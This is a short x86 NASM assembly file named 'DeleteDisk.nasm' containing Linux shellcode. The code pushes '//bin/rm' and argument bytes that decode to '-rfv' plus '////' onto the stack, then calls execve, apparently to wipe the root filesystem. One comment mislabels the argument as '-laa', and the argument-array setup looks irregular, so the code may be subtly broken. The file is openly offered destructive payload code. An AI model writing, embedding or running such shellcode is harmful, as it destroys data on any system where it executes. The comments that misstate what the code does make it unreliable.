; DeleteDisk.nasm
; Author: Ravehorn

global _start

section .text

_start:

    xor eax, eax            ;create null eax register
    push eax                ;push null eax register to the stack

    push 0x6d722f6e         ;push command to the stack
    push 0x69622f2f         ;"//bin/rm"
    mov ebx, esp            ;move pointer to command into ebx

    push eax                ;push null eax register to the stack
    push 0x7666722d         ;push argument to the stack "-laa"
    mov esi, esp            ;move stack pointer to esi
    push esi
    push 0x2f2f2f2f
    mov esi, esp

    push eax                ;push null eax register to the stack
    push esi                ;push address of the argument to the stack
    push ebx                ;push address of the command to the stack
    mov ecx, esp            ;move pointer to start of the command to ecx


    mov al, 11              ;define execve
    int 0x80                ;execute command